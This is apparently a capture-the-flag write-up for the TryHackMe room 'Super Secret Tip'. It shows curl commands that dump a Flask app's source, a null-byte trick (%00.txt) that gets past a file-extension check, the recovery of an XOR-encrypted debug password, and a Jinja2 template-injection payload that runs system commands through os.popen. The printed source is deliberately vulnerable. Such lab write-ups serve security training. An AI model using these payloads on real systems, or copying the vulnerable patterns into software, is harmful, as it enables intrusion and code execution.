<p>July 10, 2025</p>
<h1>Super Secret Tip</h1>
<p>Are you only good at one thing? You better be a matrix!</p>

<p>https://tryhackme.com/room/supersecrettip</p>

<h2>Task 1 . Exploit the machine</h2>



<img width="1524" height="34" alt="image" src="https://github.com/user-attachments/assets/46faae01-7944-456e-a7c7-b6c240b72fa4" />

<h3>TargetIP:7777/debug</h3>

<img width="1520" height="311" alt="image" src="https://github.com/user-attachments/assets/41f5c102-ac6c-42d4-86c5-a241fdb75cbd" />

<img width="1536" height="424" alt="image" src="https://github.com/user-attachments/assets/f29120d1-68d6-44c6-81b0-483edd06ee7c" />



<h3>Burp Suite & Foxy Proxy</h3>

<img width="1281" height="323" alt="image" src="https://github.com/user-attachments/assets/209272ef-36f2-49f2-a806-2923c78afd08" />

<img width="1710" height="642" alt="image" src="https://github.com/user-attachments/assets/54074084-1b06-48df-8355-1509b8bef277" />

<img width="1191" height="395" alt="image" src="https://github.com/user-attachments/assets/8b6ad71b-cf43-4c15-9af7-ec6196c54d51" />

<img width="682" height="237" alt="image" src="https://github.com/user-attachments/assets/d60bb4ce-3886-4c6d-97d4-09505a137f2d" />




```bash
:~/SuperSecretTip# curl http://10.10.44.2:7777/cloud -X POST -d "download=source.py"
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"]) 
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"]) 
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')
    
    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    
    
    session['debug'] = debug
    session['password'] = encrypted_pass
        
    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"]) 
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=False)
```

```bash
:~/SuperSecretTip# curl http://10.10.44.2:7777/cloud -X POST -d "download=supersecrettip.txt"
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

<p>debugpassword.py%00.txt = debugpassword.py<br>
.txt is ignored after the NULL BYTE `%00</p>

```bash
:~/SuperSecretTip# curl http://10.10.44.2:7777/cloud -X POST -d "download=debugpassword.py%00.txt"
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

```bash
b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

<img width="1022" height="94" alt="image" src="https://github.com/user-attachments/assets/da881e76-583a-4a3b-8975-59562c4ca8ee" />

<img width="1145" height="234" alt="image" src="https://github.com/user-attachments/assets/4feb172d-a510-45bc-b864-01f2cbedd744" />

<p>ayham:AyhamDeebugg</p>

<img width="1136" height="354" alt="image" src="https://github.com/user-attachments/assets/55644ebc-25b8-45a8-b608-7100283c9068" />

<img width="953" height="400" alt="image" src="https://github.com/user-attachments/assets/75b5635a-9387-4e45-a811-12d56c2dae48" />

<img width="946" height="259" alt="image" src="https://github.com/user-attachments/assets/31b79c0b-2c2a-4366-b2f4-25655811e37c" />

<img width="958" height="164" alt="image" src="https://github.com/user-attachments/assets/152401fc-cd15-49f7-918d-15b85fe0cf7f" />

{{namespace.__init__.__globals__.os.popen("id").read()}}


{{namespace.__init__.__globals__.os.popen("id").read()}}





<h2>Task 2 . Thank you!</h2>
